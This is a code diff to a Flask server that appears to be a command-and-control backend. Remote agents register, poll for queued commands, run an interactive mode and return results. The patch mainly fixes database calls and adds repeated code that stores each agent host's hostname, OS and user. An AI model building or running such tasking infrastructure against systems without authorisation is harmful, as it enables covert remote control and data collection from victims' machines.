@@ -399,9 +399,9 @@ def handle_agent_register_common():
                     WHERE id = ?
                 ''', (hostname, os_info, user, ip_address, agent_id))
                 
-                agent_data = agent_manager.db.fetchone("SELECT secret_key FROM agents WHERE id = ?", (agent_id,))
+                agent_data = agent_manager.db.execute("SELECT secret_key FROM agents WHERE id = ?", (agent_id,)).fetchone()
                 secret_key = agent_data['secret_key'] if agent_data else None
-                
+
                 return jsonify({
                     'status': 'success',
                     'agent_id': agent_id,
@@ -420,16 +420,16 @@ def handle_agent_register_common():
                     agent_id=agent_id
                 )
                 
-                agent_data = agent_manager.db.fetchone("SELECT secret_key FROM agents WHERE id = ?", (agent_id,))
+                agent_data = agent_manager.db.execute("SELECT secret_key FROM agents WHERE id = ?", (agent_id,)).fetchone()
                 secret_key = agent_data['secret_key'] if agent_data else None
-                
+
                 agent_manager.db.execute('''
-                    UPDATE agents 
-                    SET status = 'active', hostname = ?, os_info = ?, user = ?, 
-                        ip_address = ? 
+                    UPDATE agents
+                    SET status = 'active', hostname = ?, os_info = ?, user = ?,
+                        ip_address = ?
                     WHERE id = ?
                 ''', (hostname, os_info, user, ip_address, agent_id))
-                
+
                 return jsonify({
                     'status': 'success',
                     'agent_id': registered_agent_id,
@@ -454,7 +454,7 @@ def handle_agent_register_common():
             agent_id=agent_id  # Pass the agent's pre-assigned ID
         )
         
-        agent_data = agent_manager.db.fetchone("SELECT secret_key FROM agents WHERE id = ?", (registered_agent_id,))
+        agent_data = agent_manager.db.execute("SELECT secret_key FROM agents WHERE id = ?", (registered_agent_id,)).fetchone()
         secret_key = agent_data['secret_key'] if agent_data else None
         
         heartbeat_interval = profile_config.get('heartbeat_interval', 30)
@@ -492,28 +492,62 @@ def handle_agent_register_common():
 def handle_agent_tasks_common(agent_id):
     try:
         logger.debug(f"Task request for agent {agent_id} at: {request.path}")
-        
+
+        # Get system information from request if provided
+        data = request.get_json() or {}
+        hostname = data.get('hostname', None)
+        os_info = data.get('os_info', None)
+        user = data.get('user', None)
+
         forwarded_for = request.headers.get('X-Forwarded-For')
         if forwarded_for:
             client_ip = forwarded_for.split(',')[0].strip()
         else:
             client_ip = request.headers.get('X-Real-IP') or request.remote_addr
         logger.debug(f"Client IP for agent {agent_id}: {client_ip}")
-        
-        forwarded_for = request.headers.get('X-Forwarded-For')
-        if forwarded_for:
-            client_ip = forwarded_for.split(',')[0].strip()
-        else:
-            client_ip = request.headers.get('X-Real-IP') or request.remote_addr
-        
+
         logger.debug(f"Task request for agent {agent_id} from IP: {client_ip}")
+
+        # Update agent information if provided
         agent = agent_manager.get_agent(agent_id, update_ip=client_ip)
         if not agent:
             logger.debug(f"Agent {agent_id} not found")
             return jsonify({"status": "error", "message": "Agent not found"}), 404
-        
+
+        # Update agent system information in database if provided
+        if hostname or os_info or user:
+            update_fields = []
+            update_values = []
+
+            if hostname:
+                update_fields.append("hostname = ?")
+                update_values.append(hostname)
+            if os_info:
+                update_fields.append("os_info = ?")
+                update_values.append(os_info)
+            if user:
+                update_fields.append("user = ?")
+                update_values.append(user)
+
+            update_values.append(agent_id)
+
+            if update_fields:
+                update_query = f"UPDATE agents SET {', '.join(update_fields)} WHERE id = ?"
+                agent_manager.db.execute(update_query, update_values)
+
+                # Also update the in-memory agent if it exists
+                if agent_id in agent_manager.agents:
+                    in_memory_agent = agent_manager.agents[agent_id]
+                    with in_memory_agent.lock:
+                        if hostname:
+                            in_memory_agent.hostname = hostname
+                        if os_info:
+                            in_memory_agent.os_info = os_info
+                        if user:
+                            in_memory_agent.user = user
+
         profile_config = get_profile_config_for_listener(agent.listener_id)
-        
+
         interactive_task = agent_manager.get_interactive_task(agent_id)
         if interactive_task:
             logger.debug(f"Returning interactive task for agent {agent_id}")
@@ -522,9 +556,9 @@ def handle_agent_tasks_common(agent_id):
                 'tasks': [interactive_task],
                 'interactive_mode': True
             })
-        
+
         tasks = agent_manager.get_tasks(agent_id)
-        
+
         if not tasks:
             logger.debug(f"No tasks for agent {agent_id}")
             return jsonify({
@@ -532,7 +566,7 @@ def handle_agent_tasks_common(agent_id):
                 'tasks': [],
                 'interactive_mode': False
             })
-        
+
         task_list = []
         for task in tasks:
             task_list.append({
@@ -540,7 +574,7 @@ def handle_agent_tasks_common(agent_id):
                 'command': task['command'],
                 'created_at': task['created_at'].isoformat() if hasattr(task['created_at'], 'isoformat') else str(task['created_at'])
             })
-        
+
         logger.info(f"Returning {len(task_list)} tasks for agent {agent_id}")
         return jsonify({
             'status': 'success',
@@ -560,51 +594,82 @@ def handle_agent_results_common(agent_id):
         data = request.get_json()
         if not data:
             return jsonify({"status": "error", "message": "No data provided"}), 400
-        
+
         forwarded_for = request.headers.get('X-Forwarded-For')
         if forwarded_for:
             client_ip = forwarded_for.split(',')[0].strip()
         else:
             client_ip = request.headers.get('X-Real-IP') or request.remote_addr
         logger.debug(f"Result submission for agent {agent_id} from IP: {client_ip} at: {request.path}")
-        
+
         task_id = data.get('task_id')
         result = data.get('result', '')
         status = data.get('status', 'completed')
-        
+
+        # Get system information from request if provided
+        hostname = data.get('hostname', None)
+        os_info = data.get('os_info', None)
+        user = data.get('user', None)
+
         if not task_id:
             return jsonify({
                 'status': 'error',
                 'message': 'Task ID is required'
             }), 400
-        
-        forwarded_for = request.headers.get('X-Forwarded-For')
-        if forwarded_for:
-            client_ip = forwarded_for.split(',')[0].strip()
-        else:
-            client_ip = request.headers.get('X-Real-IP') or request.remote_addr
-        
+
         logger.debug(f"Result submission for agent {agent_id} from IP: {client_ip}")
         agent = agent_manager.get_agent(agent_id, update_ip=client_ip)
         if agent:
             profile_config = get_profile_config_for_listener(agent.listener_id)
             logger.debug(f"Agent {agent_id} belongs to listener: {agent.listener_id}")
-        
+
+        # Update agent system information in database if provided
+        if hostname or os_info or user:
+            update_fields = []
+            update_values = []
+
+            if hostname:
+                update_fields.append("hostname = ?")
+                update_values.append(hostname)
+            if os_info:
+                update_fields.append("os_info = ?")
+                update_values.append(os_info)
+            if user:
+                update_fields.append("user = ?")
+                update_values.append(user)
+
+            update_values.append(agent_id)
+
+            if update_fields:
+                update_query = f"UPDATE agents SET {', '.join(update_fields)} WHERE id = ?"
+                agent_manager.db.execute(update_query, update_values)
+
+                # Also update the in-memory agent if it exists
+                if agent_id in agent_manager.agents:
+                    in_memory_agent = agent_manager.agents[agent_id]
+                    with in_memory_agent.lock:
+                        if hostname:
+                            in_memory_agent.hostname = hostname
+                        if os_info:
+                            in_memory_agent.os_info = os_info
+                        if user:
+                            in_memory_agent.user = user
+
         is_interactive = agent_manager.is_interactive_task(agent_id, task_id)
-        
+
         if is_interactive:
             agent_manager.set_interactive_result(agent_id, task_id, result)
             logger.info(f"Interactive result received from agent {agent_id} for task {task_id}")
         else:
             agent_manager.add_result(agent_id, task_id, result)
             logger.info(f"Regular result received from agent {agent_id} for task {task_id}")
-        
+
         return jsonify({
             'status': 'success',
             'message': 'Result received',
             'task_id': task_id
         })
-        
+
     except Exception as e:
         logger.error(f"Failed to submit result from agent {agent_id}: {str(e)}")
         return jsonify({
@@ -749,11 +814,49 @@ def handle_interactive_communication(agent_id):
 
 def handle_interactive_get(agent_id, client_ip=None):
     logger.debug(f"Interactive poll from agent {agent_id}")
-    
+
+    # Get system information from request if provided
+    data = request.get_json() or {}
+    hostname = data.get('hostname', None)
+    os_info = data.get('os_info', None)
+    user = data.get('user', None)
+
     agent = agent_manager.get_agent(agent_id, update_ip=client_ip)
     if not agent:
         return jsonify({"status": "error", "message": "Agent not found"}), 404
-    
+
+    # Update agent system information in database if provided
+    if hostname or os_info or user:
+        update_fields = []
+        update_values = []
+
+        if hostname:
+            update_fields.append("hostname = ?")
+            update_values.append(hostname)
+        if os_info:
+            update_fields.append("os_info = ?")
+            update_values.append(os_info)
+        if user:
+            update_fields.append("user = ?")
+            update_values.append(user)
+
+        update_values.append(agent_id)
+
+        if update_fields:
+            update_query = f"UPDATE agents SET {', '.join(update_fields)} WHERE id = ?"
+            agent_manager.db.execute(update_query, update_values)
+
+            # Also update the in-memory agent if it exists
+            if agent_id in agent_manager.agents:
+                in_memory_agent = agent_manager.agents[agent_id]
+                with in_memory_agent.lock:
+                    if hostname:
+                        in_memory_agent.hostname = hostname
+                    if os_info:
+                        in_memory_agent.os_info = os_info
+                    if user:
+                        in_memory_agent.user = user
+
     # Check if agent is in interactive mode
     if not agent.interactive_mode:
         return jsonify({
@@ -761,7 +864,7 @@ def handle_interactive_get(agent_id, client_ip=None):
             'interactive_mode': False,
             'message': 'Not in interactive mode'
         })
-    
+
     interactive_task = agent_manager.get_interactive_task(agent_id)
     if interactive_task:
         logger.info(f"Sending interactive command to agent {agent_id}: {interactive_task['command'][:50]}...")
@@ -772,9 +875,9 @@ def handle_interactive_get(agent_id, client_ip=None):
             'task_id': interactive_task['id'],
             'timestamp': interactive_task['created_at'].isoformat() if hasattr(interactive_task['created_at'], 'isoformat') else str(interactive_task['created_at'])
         })
-    
+
     return jsonify({
-        'status': 'success', 
+        'status': 'success',
         'interactive_mode': True,
         'command': None,
         'message': 'No pending interactive commands'
@@ -784,25 +887,62 @@ def handle_interactive_post(agent_id, client_ip=None):
     data = request.get_json()
     if not data:
         return jsonify({"status": "error", "message": "No data provided"}), 400
-    
+
     logger.debug(f"Interactive result from agent {agent_id}")
-    
+
     task_id = data.get('task_id')
     result = data.get('result', '')
-    
+
+    # Get system information from request if provided
+    hostname = data.get('hostname', None)
+    os_info = data.get('os_info', None)
+    user = data.get('user', None)
+
     if not task_id:
         return jsonify({
             'status': 'error',
             'message': 'Task ID is required'
         }), 400
-    
+
     agent = agent_manager.get_agent(agent_id, update_ip=client_ip)
     if not agent:
         logger.debug(f"Agent {agent_id} not found for interactive result")
         return jsonify({"status": "error", "message": "Agent not found"}), 404
-    
+
+    # Update agent system information in database if provided
+    if hostname or os_info or user:
+        update_fields = []
+        update_values = []
+
+        if hostname:
+            update_fields.append("hostname = ?")
+            update_values.append(hostname)
+        if os_info:
+            update_fields.append("os_info = ?")
+            update_values.append(os_info)
+        if user:
+            update_fields.append("user = ?")
+            update_values.append(user)
+
+        update_values.append(agent_id)
+
+        if update_fields:
+            update_query = f"UPDATE agents SET {', '.join(update_fields)} WHERE id = ?"
+            agent_manager.db.execute(update_query, update_values)
+
+            # Also update the in-memory agent if it exists
+            if agent_id in agent_manager.agents:
+                in_memory_agent = agent_manager.agents[agent_id]
+                with in_memory_agent.lock:
+                    if hostname:
+                        in_memory_agent.hostname = hostname
+                    if os_info:
+                        in_memory_agent.os_info = os_info
+                    if user:
+                        in_memory_agent.user = user
+
     success = agent_manager.set_interactive_result(agent_id, task_id, result)
-    
+
     if success:
         logger.info(f"Interactive result received from agent {agent_id} for task {task_id}")
         return jsonify({
@@ -823,6 +963,12 @@ def handle_interactive_status(agent_id):
     else:
         client_ip = request.headers.get('X-Real-IP') or request.remote_addr
 
+    # Get system information from request if provided
+    data = request.get_json() or {}
+    hostname = data.get('hostname', None)
+    os_info = data.get('os_info', None)
+    user = data.get('user', None)
+
     if agent_manager is None:
         logger.error("Agent manager not initialized when handling interactive status request")
         return jsonify({"status": "error", "message": "Server not properly initialized"}), 500
@@ -831,6 +977,38 @@ def handle_interactive_status(agent_id):
         agent = agent_manager.get_agent(agent_id, update_ip=client_ip)
         if not agent:
             return jsonify({"status": "error", "message": "Agent not found"}), 404
+
+        # Update agent system information in database if provided
+        if hostname or os_info or user:
+            update_fields = []
+            update_values = []
+
+            if hostname:
+                update_fields.append("hostname = ?")
+                update_values.append(hostname)
+            if os_info:
+                update_fields.append("os_info = ?")
+                update_values.append(os_info)
+            if user:
+                update_fields.append("user = ?")
+                update_values.append(user)
+
+            update_values.append(agent_id)
+
+            if update_fields:
+                update_query = f"UPDATE agents SET {', '.join(update_fields)} WHERE id = ?"
+                agent_manager.db.execute(update_query, update_values)
+
+                # Also update the in-memory agent if it exists
+                if agent_id in agent_manager.agents:
+                    in_memory_agent = agent_manager.agents[agent_id]
+                    with in_memory_agent.lock:
+                        if hostname:
+                            in_memory_agent.hostname = hostname
+                        if os_info:
+                            in_memory_agent.os_info = os_info
+                        if user:
+                            in_memory_agent.user = user
 
         return jsonify({
             'status': 'success',
